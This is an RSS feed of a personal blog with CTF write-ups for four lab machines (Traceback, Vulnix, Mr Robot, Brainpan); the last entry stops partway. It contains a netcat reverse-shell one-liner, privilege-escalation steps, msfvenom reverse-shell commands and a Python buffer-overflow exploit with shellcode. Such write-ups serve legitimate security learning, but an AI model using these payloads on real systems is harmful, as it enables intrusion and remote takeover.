<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Barvent</title>
    <description>Barvent's technology blog
</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Sun, 16 Aug 2020 06:38:33 -0400</pubDate>
    <lastBuildDate>Sun, 16 Aug 2020 06:38:33 -0400</lastBuildDate>
    <generator>Jekyll v4.1.1</generator>
    
      <item>
        <title>HackTheBox: Traceback WriteUp</title>
        <description>&lt;p&gt;Traceback is an easy rated machine hosted in HackTheBox. As always, the goal is to obtain root and read the flag in /root/root.txt&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;The IP is posted in the HackTheBox webpage, so it isn’t necessary to do a network scan.
&lt;img src=&quot;port_scan.png&quot; alt=&quot;Port Scan&quot; /&gt;
From the port scan we can see that there are only two ports open (22 and 80).
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;WebPage Enumeration&lt;/h1&gt;
&lt;p&gt;The root page contains a message telling us that the website has been owned. If we read the source code we can see a little more information.
&lt;img src=&quot;web_src.png&quot; alt=&quot;Web SRC&quot; /&gt;
Searching the name “Xh4H” in Google we can find a github page with some repositories. One of them has the same text that was in the commentary and some webshells.
&lt;img src=&quot;webshells.png&quot; alt=&quot;WebShells&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;WebShell Fuzzing&lt;/h1&gt;
&lt;p&gt;I cloned the repository in my machine and created a wordlist with the shells inside of it.
&lt;img src=&quot;webshells_wordlist1.png&quot; alt=&quot;WebShells Wordlist 1&quot; /&gt;
&lt;img src=&quot;webshells_wordlist2.png&quot; alt=&quot;WebShells Wordlist 2&quot; /&gt;
After this I used Wfuzz to fuzz the website using the wordlist to find the webshell.
&lt;img src=&quot;webfuzzing.png&quot; alt=&quot;webfuzzing&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Using the WebShell&lt;/h1&gt;
&lt;p&gt;Reading the source code for the webshell we can see the default credentials.
&lt;img src=&quot;def_creds.png&quot; alt=&quot;Default Credentials&quot; /&gt;
If we go to http://10.10.10.181/smevk.php we can see that the webshell has a login page.
&lt;img src=&quot;login_page.png&quot; alt=&quot;Login page&quot; /&gt;
The webshell has a console incorporated but I prefer to have a “normal” console so I edited a reverse shell that already was on the machine to connect to my machine.
&lt;img src=&quot;files_web.png&quot; alt=&quot;Files Web&quot; /&gt;
&lt;img src=&quot;editing_rev.png&quot; alt=&quot;Edit Reverse Shell&quot; /&gt;
&lt;img src=&quot;connection.png&quot; alt=&quot;Connection&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc to Sysadmin&lt;/h1&gt;
&lt;p&gt;There is a text file inside the webadmin home.
&lt;img src=&quot;notes_txt.png&quot; alt=&quot;Note.txt&quot; /&gt;
If we run “sudo -l” we can see that webadmin can run a lua interpreter as sysadmin, so we can just run “os.execute(‘/bin/sh’)” to get a shell.
&lt;img src=&quot;sudo_webadmin.png&quot; alt=&quot;sudo -l webadmin&quot; /&gt;
&lt;img src=&quot;shell_sysadmin.png&quot; alt=&quot;Shell sysadmin&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc to Root&lt;/h1&gt;
&lt;p&gt;Running LinPeas we can see some interesting files that can be written in the /etc directory.
&lt;img src=&quot;linpeas.png&quot; alt=&quot;LinPeas&quot; /&gt;
These files are executed by root every time that someone login (in this case, using SSH). We don’t have the password for the sysadmin user but we can write inside of .ssh/authorized_keys, which means that we can use a public and private key pair to authenticate without knowing the password.
&lt;img src=&quot;ssh-keygen.png&quot; alt=&quot;Generate key&quot; /&gt;
&lt;img src=&quot;add_key.png&quot; alt=&quot;Add key&quot; /&gt;
Now we have access to the machine using SSH, but we still need to get an interactive root shell. To do so I added a new entry inside /etc/sudoers that allowed sysadmin to run commands as root without suppling the password.
&lt;img src=&quot;modified-00.png&quot; alt=&quot;00-header modified&quot; /&gt;
&lt;img src=&quot;privesc-root.png&quot; alt=&quot;PrivEsc to root&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This machine is really easy even though is easy to miss the /etc/update-motd.d files if you don’t know what they do. This is the second time that I solve this machine, just because I didn’t take notes the first time and I wanted to have some writeups from HackTheBox.&lt;/p&gt;
</description>
        <pubDate>Sun, 16 Aug 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/htb_traceback_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/htb_traceback_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>HackLab: Vulnix Write-Up</title>
        <description>&lt;p&gt;HackLab: Vulnix is an intermediate rated OSCP-like machine hosted on Vulnhub (and the last rated machine on Abatchy’s list).&lt;/p&gt;
&lt;h1&gt;Network Scan&lt;/h1&gt;
&lt;p&gt;As always, I’ve used Nmap to sweep the network and get the IP of the target machine.
&lt;img src=&quot;netScan.png&quot; alt=&quot;NetScan&quot; /&gt;
The IP of the target machine is 192.168.56.133.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;portScan.png&quot; alt=&quot;PortScan&quot; /&gt;
There are lots of open ports in this machine and most of them lead to anything. I’ll explain what can be obtained in some of them, but I don’t know how to deal with all of them.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Ports Explanation&lt;/h1&gt;
&lt;p&gt;In port 25 there is a SMTP server which has the VRFY command enabled. This can be used to enumerate some users using dictionaries and to send malicious mails to them (as the server doesn’t have any type of authentication). I’ll show this in my writeup for SneakyMailer from HackTheBox when it gets retired.&lt;br /&gt;
&lt;img src=&quot;mailEnum.png&quot; alt=&quot;Mail Enumeration&quot; /&gt;
Port 79 has a Finger server, which can also be used to enumerate users in the machine. In this case we can get more information about them like the home directory, shell used… In earlier versions of it the server could be exploited to gain shell access to the machine.
&lt;img src=&quot;fingerEnum.png&quot; alt=&quot;Finger Enumeration&quot; /&gt;
Pop3 and IMAP are protocols used to retrieve emails (the ones with an S at the end use encryption). They can be used to read the emails of the users if we get their credentials but in this case it isn’t useful (Again, I’ll show this in the writeup for SneakyMailer).&lt;br /&gt;&lt;br /&gt;
RSH is a protocol similar to SSH but without encryption. RSH, Finger and SMTP (sendmail) had vulnerabilities in the past that were exploited by the Morris worm, so I suppose they are running in the machine as an “Easter Egg”.&lt;br /&gt;&lt;br /&gt;
I don’t really know what to do with the higher ports, some of them are for RPC stuff but I don’t know if they can be used to get more information.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;NFS Enumeration&lt;/h1&gt;
&lt;p&gt;I began by running “showmount” against the machine to see what directories it was exporting. It showed the directory “/home/vulnix”, which if you recall from before is the home directory for user vulnix.
&lt;img src=&quot;showmount.png&quot; alt=&quot;Showmount&quot; /&gt;
I mounted the directory using NFSv4 but I couldn’t access it because I didn’t had the privileges to do so. I also saw that the owner of the directory was nobody, which means that the root_squash flag was enabled (more on that later).
&lt;img src=&quot;nfsv4.png&quot; alt=&quot;Mounting NFSv4&quot; /&gt;
&lt;img src=&quot;nfsv4Permissions.png&quot; alt=&quot;NFSv4 Permissions&quot; /&gt;
NFS uses the UID and the GID to authenticate the user. The UID and GID of the user in the local machine must match with the ones in the folder that is being shared to access it. NFSv4 doesn’t give out the ids for security reasons (even though they can be bruteforced with a lot of patience), but the same cannot be said for earlier versions, so I tried to mount the directory using NFSv3.
&lt;img src=&quot;nfsv3.png&quot; alt=&quot;Mounting NFSv3&quot; /&gt;
Here we can see that both the UID and the GID of the folder are 2008, so I created a user in my machine that matched these values. 
&lt;img src=&quot;addUser.png&quot; alt=&quot;User Creation&quot; /&gt;
I changed to the new user using the su command and I got access to the directory.
&lt;img src=&quot;directoryList.png&quot; alt=&quot;Directory List&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Alternative Method&lt;/h1&gt;
&lt;p&gt;Reading other people writeups I found that the machine has a user called “user” which uses a weak password. Running a bruteforce attack against the SSH server (or RSH) we can get his password. From there we can get the UID and GID of the owner and the group of the folder.&lt;br /&gt;
I didn’t use this method because the bruteforcing was going really slow and I was trying to bruteforce the credentials for root, user and vulnix, so I ended up gaining access with the first method before the bruteforce ended.
&lt;img src=&quot;userMethod.png&quot; alt=&quot;Method 2&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Gaining SSH Access&lt;/h1&gt;
&lt;p&gt;By default SSH uses the file inside /home/$USER/.ssh/authorized_keys to use public/private key authentication, so I added a key that I generated to try to get access to the machine without using the password.
&lt;img src=&quot;foothold.png&quot; alt=&quot;Foothold&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc to Root&lt;/h1&gt;
&lt;p&gt;Running sudo -l we can see that vulnix can use sudoedit without supplying the password to edit the /etc/exports file, which is the file that defines the directories that are going to be exported by NFS.
&lt;img src=&quot;sudo-l.png&quot; alt=&quot;sudo -l&quot; /&gt;
I added the /root directory to the exports file with the “no_root_squash” flag enabled, which means that if we use the root user in our machine we can work as root in the directory shared with NFS (root_squash means that NFS ignores the requests made by root). 
&lt;img src=&quot;newExports.png&quot; alt=&quot;New exports&quot; /&gt;
To use the changes made in the exports file we need to restart the NFS service but we don’t have permission to do so and I got stuck here for a long time. Eventually I gave up and looked for some hints on the Internet, just to find that everyone restarted the VM to restart the service. I did so and I got access to the /root directory with root privileges. I knew that root login was enabled in the /etc/sshd_config file, so I used the same method as before to get SSH access.
&lt;img src=&quot;SSHConfig.png&quot; alt=&quot;SSH Config&quot; /&gt;
&lt;img src=&quot;showmount2.png&quot; alt=&quot;Showmount 2&quot; /&gt;
&lt;img src=&quot;mountRoot.png&quot; alt=&quot;Mount root&quot; /&gt;
&lt;img src=&quot;privesc.png&quot; alt=&quot;PrivEsc&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This is a fairly difficult machine due to the amount of rabbit holes it has and the fact that you need to know a bit about NFS (and do some research on it) to get root (and user if you are too impatient). I didn’t like the part about restarting the VM because it isn’t something that you can do on a remote machine but overall this has been a really good learning experience.&lt;/p&gt;
</description>
        <pubDate>Sat, 08 Aug 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/hacklab_vulnix_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/hacklab_vulnix_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>Mr Robot: 1 Write-Up</title>
        <description>&lt;p&gt;MrRobot 1 is an intermediate OSCP-like machine (according to the &lt;a href=&quot;https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms&quot;&gt;Abatchy’s list&lt;/a&gt;) hosted on Vulnhub. This machine is a little bit different from the other ones, in this one the goal is to read the three hidden keys in the machine.&lt;/p&gt;
&lt;h1&gt;Network Scan&lt;/h1&gt;
&lt;p&gt;As always, I’ve used Nmap to sweep the network and get the IP of the target machine.
&lt;img src=&quot;netScan.png&quot; alt=&quot;NetScan&quot; /&gt;
The IP of the target machine is 192.168.56.132.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;portScan.png&quot; alt=&quot;PortScan&quot; /&gt;
There are only two ports open (80 and 443) and both of them host the same webpage.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port 80 Enumeration&lt;/h1&gt;
&lt;p&gt;The root page has an interactive MrRobot themed page but it doesn’t lead to anything useful. Nikto found that the site has WordPress 4.3.1 installed and I found some entries inside the robots.txt file.
&lt;img src=&quot;nikto.png&quot; alt=&quot;Nikto Output&quot; /&gt;
&lt;img src=&quot;robots.png&quot; alt=&quot;Robots.txt&quot; /&gt;
The key-1-of-3.txt file contains the first key while fsocity.dic is a dictionary with some repetitions. I removed the repetitions using “cat port80/fsocity.dic | sort | uniq &amp;gt; port80/fsocityFilt.dic”
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;WordPress Bruteforce&lt;/h1&gt;
&lt;p&gt;I noticed that the WordPress login page error message was “Invalid username”, so I tried to bruteforce the username using Hydra. To do so I used the Network Firefox utility to get the necessary parameters to login.
&lt;img src=&quot;postParams.png&quot; alt=&quot;POST Parameters&quot; /&gt; 
&lt;img src=&quot;invalidUser.png&quot; alt=&quot;Invalid username message&quot; /&gt;
&lt;img src=&quot;hydra1.png&quot; alt=&quot;Hydra User Bruteforce&quot; /&gt;
Hydra found the “Elliot” username, so I tried to bruteforce his password using the fsocity dictionary.
&lt;img src=&quot;invalidPass.png&quot; alt=&quot;Invalid password message&quot; /&gt;
&lt;img src=&quot;hydra2.png&quot; alt=&quot;Hydra Password Bruteforce&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;WordPress Access&lt;/h1&gt;
&lt;p&gt;Using the credentials found with Hydra I logged in as Elliot, who has Administrator privileges.
&lt;img src=&quot;wordpressUsers.png&quot; alt=&quot;WordPress Users&quot; /&gt;
With the Administrator privileges we can simply edit a php file of the template with a simple php shell (I used 404.php because it is easy to get it executed). I also found that we can upload a malicious plugin or try to use both CVE-2019-8942 and CVE-2019-8943 to get RCE (I wasn’t able to exploit them).
&lt;img src=&quot;404Edit.png&quot; alt=&quot;Editing 404&quot; /&gt;
Once I had the simple shell I executed “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.56.10 1234 &amp;gt;/tmp/f” to get a reverse shell.
&lt;img src=&quot;revShell1.png&quot; alt=&quot;Reverse shell 1&quot; /&gt;
&lt;img src=&quot;revShell2.png&quot; alt=&quot;Reverse shell 2&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Daemon Shell&lt;/h1&gt;
&lt;p&gt;I found the second key and a MD5 hash inside the /home/robot/ directory, but the key wasn’t readable with my user, so I used hashcat to crack the hash.
&lt;img src=&quot;lsRobotHome.png&quot; alt=&quot;ls /home/robot/&quot; /&gt;
&lt;img src=&quot;passwordMD5.png&quot; alt=&quot;password.raw-md5&quot; /&gt;
&lt;img src=&quot;hashcat.png&quot; alt=&quot;Hashcat cracking&quot; /&gt;
Hashcat cracked the hash successfully, giving us the password “abcdefghijklmnopqrstuvwxyz”.&lt;/p&gt;
&lt;h1&gt;Robot Shell and Privesc to Root&lt;/h1&gt;
&lt;p&gt;Using “su robot” with the “abcdefghijklmnopqrstuvwxyz” password I got access to the robot user. Running LinEnum I saw that Nmap was installed in the machine and that it had the SetUID bit enabled. Nmap has an interactive mode, so I used it to get a shell with an efective user id of 0 (root). I know that there are methods to get UID == 0, but having only the EUID was fine for me. The last key was inside /root/.
&lt;img src=&quot;privesc.png&quot; alt=&quot;PrivEsc to root&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;This is a really straightforward machine if you know what are you doing, so I don’t really get why it is rated as intermediate. Nevertheless, it is a funny machine to root, even though it is a little bit too CTF-like for me.&lt;/p&gt;
</description>
        <pubDate>Wed, 05 Aug 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/mrrobot_1_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/mrrobot_1_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>Brainpan: 1 Write-Up</title>
        <description>&lt;p&gt;Brainpan 1 is an intermediate OSCP-like machine hosted on Vulnhub which features a Windows x86 buffer overflow as the foothold.&lt;/p&gt;
&lt;h1&gt;Network Scan&lt;/h1&gt;
&lt;p&gt;As always, I’ve used Nmap to sweep the network and get the IP of the target machine.
&lt;img src=&quot;netScan.png&quot; alt=&quot;NetScan&quot; /&gt;
The IP of the target machine is 192.168.56.131, as .10 is my machine.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;portScan.png&quot; alt=&quot;PortScan&quot; /&gt;
This time there are two services listening in strange ports, so I used the default NSE scripts to gather more information about them.
&lt;img src=&quot;port9999NSE.png&quot; alt=&quot;Port 9999 NSE&quot; /&gt;
&lt;img src=&quot;port10000NSE.png&quot; alt=&quot;Port 10000 NSE&quot; /&gt;
Port 9999 has an unknown application which asks for a password, while port 10000 is a Python SimpleHTTPServer.&lt;/p&gt;
&lt;h1&gt;Port 10000 Enumeration&lt;/h1&gt;
&lt;p&gt;In the root page we get an image with some good coding practices.
&lt;img src=&quot;rootPage.png&quot; alt=&quot;Root web page&quot; /&gt;
I couldn’t find anything interesting while enumerating manually, but Gobuster found a directory.
&lt;img src=&quot;gobuster.png&quot; alt=&quot;Gobuster&quot; /&gt;
The bin directory has directory listing enabled and from there we can download a Windows executable.
&lt;img src=&quot;binDirectory.png&quot; alt=&quot;Bin dir&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Brainpan.exe and Obtaining a Shell&lt;/h1&gt;
&lt;p&gt;Brainpan.exe is the program that is listening on port 9999 on the target machine.
&lt;img src=&quot;execBrain.png&quot; alt=&quot;Exec brain 1&quot; /&gt;
&lt;img src=&quot;execBrain2.png&quot; alt=&quot;Exec brain 2&quot; /&gt;
I attempted to bruteforce the password while I was examining the code using OllyDbg.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;pass &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;test.txt&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;do
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt; | nc localhost 9999 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ACCESS DENIED&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;then
                &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt; works!
                &lt;span class=&quot;nb&quot;&gt;exit
        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi
done&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I found the password when I was reading the get_reply function (the string that is being passed as a parameter to strcmp), but using it didn’t do anything. I also noticed that the program uses the strcpy function, which is unsafe.
&lt;img src=&quot;ollyDBGCode.png&quot; alt=&quot;Olly Code&quot; /&gt;
I used msf-pattern_create to generate a pattern with 1000 characters to test if the application crashes and then I used msf-pattern_offset to get the exact position.
&lt;img src=&quot;BOFTest1.png&quot; alt=&quot;BOF Test 1&quot; /&gt;
&lt;img src=&quot;BOFTest2.png&quot; alt=&quot;BOF Test 2&quot; /&gt; 
&lt;img src=&quot;BOFTest3.png&quot; alt=&quot;BOF Test 3&quot; /&gt;
To control the EIP register we need to send 524 junk bytes and the direction where we want to jump. I also found a function called winkwink with a “JMP esp” instruction at 0x311712F3, which means that we can try to execute some shellcode (I should have checked the memory protections to see if NX was enabled, but I didn’t know how to do this with OllyDbg and I didn’t have a Windows VM prepared).&lt;br /&gt;
I generated two shellcodes, one for Windows and the other one for Linux using msfvenom.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.56.10 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1234 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; py &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; shellcode &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; x86 –platform Windows &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#Windows shellcode&lt;/span&gt;
msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x86/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1234 &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.56.10 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; py &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; shellcode &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; x86 –platform Linux &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#Linux shellcode&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;At first the shellcode didn’t execute properly, so I searched on the Internet and I found the NOP Sled technique, which consists in placing some NOP instructions before the shellcode to try to ensure that the shellcode will be executed completely. Using 16 NOPs (0x90) makes the shellcode work properly.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#Linux shellcode generated using msf-venom
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;b&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xda\xd1\xd9\x74\x24\xf4\x58\xbb\x3d\xfb\x67&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3e\x2b\xc9\xb1\x12\x31\x58\x17\x83\xe8\xfc&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x03\x65\xe8\x85\xcb\xa4\xd5\xbd\xd7\x95\xaa&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x12\x72\x1b\xa4\x74\x32\x7d\x7b\xf6\xa0\xd8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x33\xc8\x0b\x5a\x7a\x4e\x6d\x32\xbd\x18\xb5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc8\x55\x5b\xc6\xc8\x77\xd2\x27\x60\x11\xb5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xf6\xd3\x6d\x36\x70\x32\x5c\xb9\xd0\xdc\x31&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x95\xa7\x74\xa6\xc6\x68\xe6\x5f\x90\x94\xb4&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                                                                                         
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcc\x2b\xbb\x88\xf8\xe6\xbc&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#Junk bytes to fill the buffer
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;524&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#Address of the JMP esp instruction
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;retAddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x311712F3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#Payload with 16 NOPs
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;retAddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I used the Linux shellcode because I knew that the target machine was using Linux (and I already tested it in my machine, so I knew that it would work).
